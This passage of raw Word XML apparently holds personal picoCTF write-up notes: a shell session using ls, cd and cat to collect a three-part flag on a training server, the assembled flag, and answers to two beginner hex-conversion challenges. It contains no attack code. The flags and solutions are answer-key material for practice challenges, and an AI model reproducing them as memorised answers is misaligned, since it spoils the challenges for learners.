          <w:delText>ssh ctf-player@venus.picoctf.net -p 6d448c9c</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1D32482B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="7" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="8" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="2" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5CEE026D" wp14:editId="31DFF49A">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>455930</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>635</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="3592195" cy="2819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3592195" cy="2819400"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D076992" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="9" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1069D89D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="10" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47A7B8F4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="11" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="086F5225" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="12" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31AEFF54" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="13" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21860199" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="14" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CF81A62" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="15" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4518E63C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="16" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67457452" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="17" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E8C5689" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="18" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18E0C36D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="19" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01B5F79B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="20" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>1of3.flag.txt  instructions-to-2of3.txt</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3CE8A1F7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="21" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ cat 1of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="439A6476" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="22" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>picoCTF</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>{</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>xxsh</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>_</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="150CEAA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="23" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ cat instructions-to-2of3.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B92855F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="24" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>Next, go to the root of all things, more succinctly `/`</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F1367A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="25" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>$ cd /</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="167C38DA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="26" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="369DCC1A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="27" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">2of3.flag.txt  dev   instructions-to-3of3.txt  media  proc  </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>sbin</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>tmp</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5EABD12B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="28" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>bin</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>etc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">   lib</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>mnt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">    root  </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>srv</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>usr</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="008442A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="29" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>boot</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       home  lib64</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       opt    run   sys   var</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6CFDC6F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="30" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ cat 2of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EC640A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="31" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>0ut_0f_\/\/4t3r_</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76AB2D18" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="32" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ cat instructions-to-3of3.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FEDD72D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="33" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">Lastly, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>-player, go home... more succinctly `~`</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="02648ABB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="34" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>$ cd ~</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="662ACFF1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="35" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1378509C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="36" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>3of3.flag.txt  drop-in</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09B9250D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="37" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ cat 3of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1ECF15ED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="38" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>5190b070}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0988F367" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="39" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">$ </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65EE62C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="40" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z"/>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05503427" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="41" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>picoCTF</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>{xxsh_</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="42" w:author="Unknown Author" w:date="2022-08-26T10:22:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>0ut_0f_\/\/4t3r_</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="43" w:author="Unknown Author" w:date="2022-08-26T10:21:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>5190b070}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70ED770F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FD71CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Lets Warm Up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7603F9AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118E35C5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{p}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B18AD4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>0x70 =B01110000 =64+32+16=112 =p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1127ACB4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Warmed Up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A192605" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>What is 0x3D (base 16) in decimal (base 10)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D4633B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">0x3D =B00111101 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEFD154" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
